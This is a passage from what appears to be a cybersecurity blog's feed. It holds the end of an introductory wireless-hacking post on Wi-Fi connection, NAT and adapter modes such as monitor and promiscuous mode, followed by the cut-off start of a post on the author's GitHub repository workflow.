 DHCPServer-&gt;&gt;Network: DHCP Acknowledgment (Confirm IP assigned)
 Network-&gt;&gt;Client: DHCP Acknowledgment

 Client-&gt;&gt;DHCPServer: Communication with assigned IP&lt;/template&gt;&lt;h3 class="heading-element" id="working-of-wifi"&gt;&lt;span&gt;39.8 Working Of WIFI&lt;/span&gt;
 &lt;a href="#working-of-wifi" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Device Connection to the Network:&lt;/strong&gt; When a device (e.g., a computer, smartphone, or IoT device) connects to a network, it typically does so via a physical connection (e.g., Ethernet cable) or wirelessly through Wi-Fi. The device sends a request to join the network, and the network infrastructure, including the router, facilitates the connection.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Obtaining an IP Address:&lt;/strong&gt; Once connected, the device needs to obtain an IP address to communicate on the network. There are two main methods for IP address assignment: static and dynamic. In the case of dynamic IP address assignment, the device sends a request to the router using the DHCP protocol, which we discussed earlier. The router then assigns an available IP address from its pool and provides it to the device.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Local Network Communication:&lt;/strong&gt; With the assigned IP address, the device can now communicate with other devices on the local network. It can send data packets to other devices by addressing them using their IP addresses within the same network. This communication happens directly between devices within the network without involving the router.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Destination Outside the Local Network:&lt;/strong&gt; If the device wants to communicate with a destination outside the local network (e.g., a website or a server on the internet), it follows these steps:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 class="heading-element" id="determining-the-gateway"&gt;&lt;span&gt;39.8.1 Determining the Gateway&lt;/span&gt;
 &lt;a href="#determining-the-gateway" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;The device checks its &lt;strong&gt;network configuration&lt;/strong&gt; and identifies the &lt;strong&gt;default gateway&lt;/strong&gt;, which is the &lt;strong&gt;IP address of the router&lt;/strong&gt;. The gateway acts as the &lt;strong&gt;exit point&lt;/strong&gt; for traffic leaving the local network.&lt;/p&gt;
&lt;h4 class="heading-element" id="data-routing"&gt;&lt;span&gt;39.8.2 Data Routing&lt;/span&gt;
 &lt;a href="#data-routing" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;The device &lt;strong&gt;encapsulates the data&lt;/strong&gt; it wants to send within &lt;strong&gt;packets&lt;/strong&gt;. Each packet contains the &lt;strong&gt;destination IP address&lt;/strong&gt;. When sent, the packets are forwarded to the &lt;strong&gt;default gateway&lt;/strong&gt; (router).&lt;/p&gt;
&lt;h4 class="heading-element" id="network-address-translation-nat"&gt;&lt;span&gt;39.8.3 Network Address Translation (NAT)&lt;/span&gt;
 &lt;a href="#network-address-translation-nat" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;Upon receiving the packets, the router performs &lt;strong&gt;Network Address Translation (NAT)&lt;/strong&gt;. It replaces the &lt;strong&gt;source IP address&lt;/strong&gt; with its own &lt;strong&gt;public IP address&lt;/strong&gt;, &lt;strong&gt;hiding private IPs&lt;/strong&gt; of local devices. This ensures that &lt;strong&gt;response packets&lt;/strong&gt; can return to the router.&lt;/p&gt;
&lt;h4 class="heading-element" id="routing-to-the-internet"&gt;&lt;span&gt;39.8.4 Routing to the Internet&lt;/span&gt;
 &lt;a href="#routing-to-the-internet" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;The router examines the &lt;strong&gt;destination IP&lt;/strong&gt; and checks its &lt;strong&gt;routing table&lt;/strong&gt; to find the &lt;strong&gt;next-hop router&lt;/strong&gt; or &lt;strong&gt;gateway&lt;/strong&gt;. It forwards the packets until they reach the &lt;strong&gt;destination network&lt;/strong&gt; (e.g., the internet).&lt;/p&gt;
&lt;h4 class="heading-element" id="public-ip-communication"&gt;&lt;span&gt;39.8.5 Public IP Communication&lt;/span&gt;
 &lt;a href="#public-ip-communication" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;Response packets are routed back using the router’s &lt;strong&gt;public IP address&lt;/strong&gt;. The router uses its &lt;strong&gt;NAT records&lt;/strong&gt; to translate the &lt;strong&gt;destination IP&lt;/strong&gt; back to the &lt;strong&gt;private IP&lt;/strong&gt; of the originating device.&lt;/p&gt;
&lt;h4 class="heading-element" id="delivery-to-the-device"&gt;&lt;span&gt;39.8.6 Delivery to the Device&lt;/span&gt;
 &lt;a href="#delivery-to-the-device" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;The router &lt;strong&gt;forwards the response packets&lt;/strong&gt; to the correct device on the &lt;strong&gt;local network&lt;/strong&gt;. The device processes the data, enabling the user to &lt;strong&gt;view webpages&lt;/strong&gt;, &lt;strong&gt;receive emails&lt;/strong&gt;, or &lt;strong&gt;use internet services&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;Each device on the network uses Router’s Public Ip address to communicate to the whole world.&lt;/p&gt;&lt;/div&gt;&lt;h3 class="heading-element" id="wi-fi-adapter-operation-modes"&gt;&lt;span&gt;39.9 Wi-Fi Adapter Operation Modes&lt;/span&gt;
 &lt;a href="#wi-fi-adapter-operation-modes" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Wi-Fi adapters can function in various &lt;strong&gt;modes&lt;/strong&gt;, depending on their features and configuration. These modes define how the adapter handles the &lt;strong&gt;transmission and reception&lt;/strong&gt; of wireless signals.&lt;/p&gt;
&lt;h4 class="heading-element" id="infrastructure-managed-mode"&gt;&lt;span&gt;39.9.1 Infrastructure (Managed) Mode&lt;/span&gt;
 &lt;a href="#infrastructure-managed-mode" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;This is the &lt;strong&gt;standard mode&lt;/strong&gt; for most Wi-Fi adapters. In infrastructure mode, the adapter &lt;strong&gt;connects to a wireless router or access point&lt;/strong&gt; to join an existing network. It enables the device to &lt;strong&gt;access the internet&lt;/strong&gt; and &lt;strong&gt;communicate with other devices&lt;/strong&gt; within the same network.&lt;/p&gt;
&lt;h4 class="heading-element" id="soft-access-point-soft-ap-mode"&gt;&lt;span&gt;39.9.2 Soft Access Point (Soft AP) Mode&lt;/span&gt;
 &lt;a href="#soft-access-point-soft-ap-mode" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;Some adapters support &lt;strong&gt;Soft AP mode&lt;/strong&gt;, which allows them to act as &lt;strong&gt;virtual access points&lt;/strong&gt;. In this configuration, the adapter &lt;strong&gt;creates its own wireless network&lt;/strong&gt;, letting other devices &lt;strong&gt;connect to it&lt;/strong&gt;. Useful for &lt;strong&gt;sharing an internet connection&lt;/strong&gt; or setting up a &lt;strong&gt;temporary local network&lt;/strong&gt;.&lt;/p&gt;
&lt;h4 class="heading-element" id="monitor-mode"&gt;&lt;span&gt;39.9.3 Monitor Mode&lt;/span&gt;
 &lt;a href="#monitor-mode" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Monitor mode&lt;/strong&gt; allows the adapter to &lt;strong&gt;passively capture all wireless signals&lt;/strong&gt; in range &lt;strong&gt;without joining a network&lt;/strong&gt;. It’s used for &lt;strong&gt;analyzing wireless traffic&lt;/strong&gt;, &lt;strong&gt;network diagnostics&lt;/strong&gt;, or &lt;strong&gt;packet sniffing&lt;/strong&gt; for &lt;strong&gt;security&lt;/strong&gt; or &lt;strong&gt;troubleshooting&lt;/strong&gt;.&lt;/p&gt;
&lt;h4 class="heading-element" id="promiscuous-mode"&gt;&lt;span&gt;39.9.4 Promiscuous Mode&lt;/span&gt;
 &lt;a href="#promiscuous-mode" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;While similar to monitor mode, &lt;strong&gt;promiscuous mode&lt;/strong&gt; focuses on &lt;strong&gt;capturing all traffic&lt;/strong&gt; the adapter can receive, &lt;strong&gt;regardless of destination&lt;/strong&gt;. It is used in &lt;strong&gt;network analysis&lt;/strong&gt; and &lt;strong&gt;security assessments&lt;/strong&gt; to inspect and study &lt;strong&gt;data packets&lt;/strong&gt; for &lt;strong&gt;anomalies&lt;/strong&gt; or &lt;strong&gt;threats&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;All of the above-mentioned modes are not available in all WIFI adaptors, there are only specific WIFI adaptors in the market that supports modes other than managed mode. So to fully learn from these series you will have to get an adaptor which these modes&lt;/p&gt;&lt;/div&gt;&lt;p&gt;There is a list of WIFI adaptors from which you can choose:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.amazon.com/dp/B01MZD7Z76"target="_blank" rel="external nofollow noopener noreferrer"&gt;Alfa AC1900 WiFi Adapter&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.amazon.com/dp/B00VEEBOPG"target="_blank" rel="external nofollow noopener noreferrer"&gt;Alfa Long-Range Dual-Band AC1200 Wireless USB 3.0&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.amazon.fr/dp/B002SZEOLG"target="_blank" rel="external nofollow noopener noreferrer"&gt;TP-Link Nano USB Wifi Dongle 150Mbps High Gain Wireless Network Adapter&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.amazon.com/dp/B01EOQ61KI"target="_blank" rel="external nofollow noopener noreferrer"&gt;TRENDnet AC1900 High Power Dual Band Wireless USB Adapter&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.getic.fr/product/alfa-awus036nha"target="_blank" rel="external nofollow noopener noreferrer"&gt;Alfa AWUS036NHA&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.amazon.com/dp/B004AC0L4Y"target="_blank" rel="external nofollow noopener noreferrer"&gt;Panda Wireless® Mid Range 150Mbps&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="conclusion"&gt;&lt;span&gt;40 Conclusion&lt;/span&gt;
 &lt;a href="#conclusion" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In this first part of our wireless hacking series, we’ve laid the foundation for understanding how Wi-Fi networks work, covering the fundamental concepts, essential terms, and the history behind the technology. Understanding these basics is key to mastering more advanced topics like network security, encryption protocols, and wireless attacks.&lt;/p&gt;
&lt;p&gt;As we move forward, we’ll dive deeper into practical techniques and tools that will help us secure and audit wireless networks. In the next part, we’ll set up a safe, isolated testing environment to begin experimenting with attacks, allowing us to learn by doing.&lt;/p&gt;</description></item><item><title>Github Workflow</title><link>https://Pr0xyG33k.github.io/posts/github/</link><pubDate>Mon, 12 May 2025 18:26:49 +0200</pubDate><author>1024@Pr0xyG33k.github.io (ProxyGeek)</author><guid>https://Pr0xyG33k.github.io/posts/github/</guid><category domain="https://Pr0xyG33k.github.io/categories/thoughts/">Thoughts</category><description>&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;Behind every well-organized repo lies a story of purpose, experimentation, and constant iteration.&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h2 class="heading-element" id="about"&gt;&lt;span&gt;13 About&lt;/span&gt;
 &lt;a href="#about" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;After years of hands-on experience in cybersecurity and development, I’ve learned that code is just one part of the battle. The &lt;strong&gt;structure&lt;/strong&gt; we build around our work — our process, our repository, our mindset — is what allows our projects to scale, evolve, and remain resilient.&lt;/p&gt;
&lt;p&gt;This GitHub Page is more than just a collection of code — it&amp;rsquo;s a reflection of my workflow, my evolution, and the systems I’ve put in place to stay adaptable in a fast-changing world.&lt;/p&gt;
&lt;h2 class="heading-element" id="architecture"&gt;&lt;span&gt;14 Architecture&lt;/span&gt;
 &lt;a href="#architecture" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;To give you a better idea of how I separate concerns and automate deployments, here&amp;rsquo;s a simplified view of the repository workflow&lt;/p&gt;
&lt;p&gt;Each directory, file, and branch serves a purpose. Here’s a high-level overview of how my main repository is structured:&lt;/p&gt;
&lt;pre class="mermaid"&gt;flowchart LR
 L[Local Files]
 L2[Local Files]

 GH_Private[(GitHub Private Repo)]
 GH_Public[(GitHub Public Repo)]

 Actions[GitHub Actions]

 GH_Pages[GitHub Pages]
 Vercel[Vercel]
 More[More...]

 L --&gt;|Git Push| GH_Private
